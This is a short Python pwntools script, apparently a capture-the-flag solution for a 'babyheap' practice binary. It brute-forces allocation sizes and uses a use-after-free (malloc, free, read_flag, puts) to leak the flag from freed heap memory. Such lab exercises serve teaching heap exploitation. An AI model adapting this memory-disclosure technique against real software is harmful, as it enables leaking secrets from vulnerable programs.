from pwn import *
from sys import argv

def malloc(size):
    p.sendlineafter(b"[*] Function (malloc/free/puts/read_flag/quit): ", b"malloc")
    p.sendlineafter(b"Size: ", size.encode())

def free():
    p.sendlineafter(b"[*] Function (malloc/free/puts/read_flag/quit): ", b"free")

def read_flag():
    p.sendlineafter(b"[*] Function (malloc/free/puts/read_flag/quit): ", b"read_flag")

def puts():
    p.sendlineafter(b"[*] Function (malloc/free/puts/read_flag/quit): ", b"puts")


# size brute-forcing 
# v8 = rand() % 872 + 128;
# size_4 = malloc(v8);
# printf("[*] flag_buffer = %p\n", size_4);

for i in range(32, 1024, 8):
    p = process("./babyheap_level" + argv[1])
    print(f"[+] Trying size: {i}")

    try:
        malloc(str(i))
        free()
        read_flag()
        puts()
        output = p.recvall(timeout=1)

        if b"pwn" in output:
            print(f"[!] Found at size: {i}")
            print(output.decode(errors='ignore'))
            break
        else:
            p.close()
    except EOFError:
        p.close()
